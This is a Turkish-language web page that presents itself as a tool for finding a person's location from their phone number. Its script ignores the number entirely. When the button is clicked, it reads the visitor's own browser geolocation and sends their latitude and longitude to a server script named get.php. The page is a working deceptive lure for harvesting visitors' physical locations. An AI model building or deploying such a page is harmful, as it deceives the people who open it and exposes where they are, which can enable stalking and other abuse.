<!DOCTYPE html>
<html>
 <head>
  <title>
   ◘◘Yer Tespiti◘◘
  </title>
  <link href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSvdY8JAg6BTge7Sls8Z6MpcN0NEZWLZPzW04hk6CPYqnrTjBBNpg" rel="shortcut icon"/>
  <style type="text/css">
   .div1{
      background-color:#040302;
      height: 600px;
      width: 500px;
      border-radius: 25px;
      border:4px solid green;
      opacity: 0.8;
      filter: alpha(opacity=40);
    }
    .text{
      color:red;
      font-size: 48px;
      background-color:black;
      padding-bottom: 20px;
      border-radius: 48px; 
    }
    .text2{
      color:orange;
      font-size:28px;
      background-color:black;
      border-radius: 50px;
      padding-top: 25px;
      padding-bottom: 25px;
    }
    .input{
     height: 40px; 
     width: 250px; 
     font-size: 18px; 
     padding: 5px; 
     margin-bottom: 15px; 
     border-radius: 7px; 
     background-color:#b4b2b2; 
     border: none; 
     color: #000; 
    }
    .button{
     width: 100px; 
     font-size: 18px;  
     margin: 0 auto;
     background-color: red; 
     border: none; 
     height: 40px; 
    border-radius: 5px;
    }
     canvas { 
     display: block; 
     position: fixed; 
  top: 0; 
  left: 0; 
     z-index: -1000; 
 }
 .body{
  background-image:url("https://gdverhuur.nl/wp-content/uploads/2018/03/rood-zwarte-abstracte-bureaublad-achtergrond.jpg");
 }
  </style>
 </head>
 <body class='body'>
  <center>
   <div class="div1">
    <p class="text">
     Yer Tespiti
    </p>

     <p class="text2">
      Konumunu bulmak istediğiniz kişinin size ne kadar uzak olduğunu öğrenmek için lütfen telefon numarasını yazınız.
     </p>
     <p style="color:red;font-size:14px;">Numara</p>
     <input class="input" name="realnumber" placeholder="+905xx xxx xx xx" type="text"/><br>
     <p id='submitt'><button type="submit" onclick="getuserLocation();"  style="width: 150px; 
     font-size: 18px;  
     margin: 0 auto;
     background-color: red; 
     border: none; 
     height: 40px; 
    border-radius: 5px;">Gönder</button></p>

      </br>
     </br>
   </div>
  </center>



		<p id="KUL_DENE"></p>       

<div id="HAR_DENE"></div>

        <script>
            var x=document.getElementById("KUL_DENE");
            function getuserLocation(){
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(showuserPosition,showbrowserError);
                }
                else{
                    x.innerHTML="TARAYICI GEOLOCATION I DESTEKLEMIYOR";
                }
            }
       
        function showuserPosition(position) {
            var latlon=position.coords.latitude+","+position.coords.longitude;
            var img_url="http://maps.googleapis.com/maps/api/staticmap?center="
            +latlon+"&zoom=14&size=400x300&sensor=false";
            document.getElementById("HAR_DENE").innerHTML=latlon;
            window.location = "get.php?veri="+latlon;
            
        }

        function showbrowserError(error){
            switch(error.code)
            {
                case error.PERMISSION_DENIED:
                x.innerHTML="KULLANICI GEOLOCATION TALEBINI REDDETTI"
                break;
                case error.POSITION_UNAVAILABLE:
                x.innerHTML="KONUM BILGISI YOK"
                break;
                case error.TIMEOUT:
                x.innerHTML="ZAMAN ASIMI"
                break;
                case error.UNKNOWN_ERROR:
                x.innerHTML="BILINMEYEN HATA"
                break;
            }
        }
        </script>











